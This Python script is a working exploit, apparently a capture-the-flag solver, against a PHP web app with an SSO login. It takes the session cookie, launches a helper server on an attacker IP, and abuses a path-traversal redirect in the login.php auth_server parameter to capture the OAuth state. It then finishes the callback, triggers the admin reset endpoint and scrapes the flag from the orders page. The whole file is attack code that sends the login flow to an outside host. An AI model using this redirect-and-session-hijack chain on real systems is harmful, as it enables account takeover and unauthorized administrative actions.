from subprocess import Popen, PIPE
import urllib.parse as parse
import requests
import re
import time

# Simple HTTP server for serving the exploit
# Usage: python web.py
# Note: This script requires Python 3.x

TARGET_URI = "http://{{BASE_HOST}}"
HOST = "172.31.37.37"
PORT = 8000
LENGTH = 208

s = requests.Session()
s.get(TARGET_URI)
phpsession = s.cookies.get_dict()["PHPSESSID"]
print(f"PHPSESSID={phpsession}")

webserver = Popen(["python3", "web.py", f"{PORT}", parse.urlparse(TARGET_URI).hostname, phpsession, str(LENGTH)])
print("waiting...")
time.sleep(3)
a = s.get(f"{TARGET_URI}/login.php?auth_server={TARGET_URI}/sso/../logout.php%3freturn_uri=http://{HOST}:{PORT}", allow_redirects=False)
query = parse.parse_qs(parse.urlparse(a.headers['Location']).query)
state = query['state'][0]

s.get(f"{TARGET_URI}/callback.php?code=a&state={state}", allow_redirects=False)
s.get(f"{TARGET_URI}/admin/reset.php")
time.sleep(1)
webserver.kill()

res = s.get(f"{TARGET_URI}/orders.php")
print(res.text)

flag = re.findall("value=(.*)<br />Price", res.text)[0]
print(f"Flag: {parse.unquote(flag)}")
